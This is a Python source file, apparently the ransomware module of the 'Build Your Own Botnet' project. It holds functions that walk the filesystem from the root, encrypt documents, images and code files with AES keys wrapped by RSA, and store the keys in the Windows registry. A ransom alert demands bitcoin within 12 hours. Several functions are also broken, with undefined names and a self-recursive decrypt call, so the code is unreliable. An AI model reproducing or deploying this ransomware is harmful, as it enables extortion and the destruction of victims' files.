#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard library
import os
import sys
import json
import Queue
import base64
import pickle
import _winreg
import threading
import cStringIO
import collections
import Crypto.Util
import Crypto.Hash.HMAC
import Crypto.Cipher.AES
import Crypto.Hash.SHA256
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP

# byob
import util


jobs    = Queue.Queue()
workers = collections.OrderedDict()


def _threader(tasks):
    try:
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(task)
                tasks.task_done()
            except:
                break
    except Exception as e:
        util.debug("{} error: {}".format(_threader.func_name, str(e)))


def request_payment(bitcoin_wallet=None, payment_url=None):
    """
    Request ransom payment from user with a Windows alert message box
    """
    try:
        if os.name is 'nt':
            if bitcoin_wallet:
                alert = util.alert(text = "Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). Below is the temporary bitcoin wallet address created for the transfer. It expires in 12 hours from now at %s, at which point the encryption key will be deleted unless you have paid." %  time.localtime(time.time() + 60 * 60 * 12))
            elif payment_url:
                alert = util.alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session['id'], payment_url), "Windows Alert")
            return "Launched a Windows Message Box with ransom payment information"
        else:
            return "{} does not yet support {} platform".format(request_payment.func_name, sys.platform)
    except Exception as e:
        return "{} error: {}".format(request_payment.func_name, str(e))
    

def encrypt_file(path):
    """
    Encrypt a file
    """
    try:
        if not os.path.isfile(path) or not os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
            return
        aes_key = Crypto.Hash.MD5.new(Crypto.get_random_bytes(16)).hexdigest()
        with open(path, 'rb') as fp:
            plaintext = fp.read()
        ciphertext = crypto.encrypt_aes(plaintext, key)
        with open(path, 'wb') as fd:
            fd.write(ciphertext)
        cipher  = Crypto.Cipher.PKCS1_OAEP.new(publickey)
        key     = base64.b64encode(cipher.encrypt(aes_key))
        util.registry_key(r'SOFTWARE\BYOB', path, key)
        util.debug('{} encrypted'.format(path))
    except Exception as e:
        util.debug("{} error: {}".format(encrypt.func_name, str(e)))


def decrypt_file(args):
    """
    Decrypt a file
    """
    try:
        rsa_key, aes_key, path = args
        cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
        aes     = cipher.decrypt(base64.b64decode(aes_key))
        result  = decrypt_file(path, aes)
        util.debug('%s decrypted' % result)
    except Exception as e:
        util.debug("{} error: {}".format(decrypt_files.func_name, str(e)))


def encrypt_files(target, public_rsa_key):
    """
    Encrypt all files that are not directly required for the machine to function
    """
    try:
        if os.path.exists(str(target)):
            if os.path.isfile(target):
                return encrypt_file(target)
            elif os.path.isdir(target):
                workers["tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, dirname, files: [jobs.put_nowait((encrypt_file, os.path.join(dirname, path))) for path in files], None), name=time.time())
                workers["tree-walk"].daemon = True
                workers["tree-walk"].start()
                time.sleep(2)
                for i in range(10):
                    workers["encrypt-files-%d" % i] = threading.Thread(target=_threader, args=(jobs,), name=time.time())
                    workers["encrypt-files-%d" % i].daemon = True
                    workers["encrypt-files-%d" % i].start()
                return "Encrypting files"
        elif not _debug:
            return encrypt_files('/')
        else:
            return "Error: {} does not exist".format(target)
    except Exception as e:
        util.debug("{} error: {}".format(encrypt_files.func_name, str(e)))


def decrypt_files(private_rsa_key):
    """
    Decrypt all files after ransom has been paid
    """
    try:
        rsa_key = Crypto.PublicKey.RSA.importKey(private_rsa_key)
        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\BYOB', 0, _winreg.KEY_READ)
        i = 0
        while True:
            try:
                path, aes_key, _ = _winreg.EnumValue(r, i)
                jobs.put_nowait((decrypt_file, (rsa_key, aes_key, path)))
                i += 1
            except:
                break
        for i in range(1,10):
            workers["decrypt-files-%d" % i] = threading.Thread(target=_threader, args=(jobs,), name=time.time())
            workers["decrypt-files-%d" % i].daemon = True
            workers["decrypt-files-%d" % i].start()
        return "Decrypting files"
    except Exception as e:
        util.debug("{} error: {}".format(decrypt_files.func_name, str(e)))


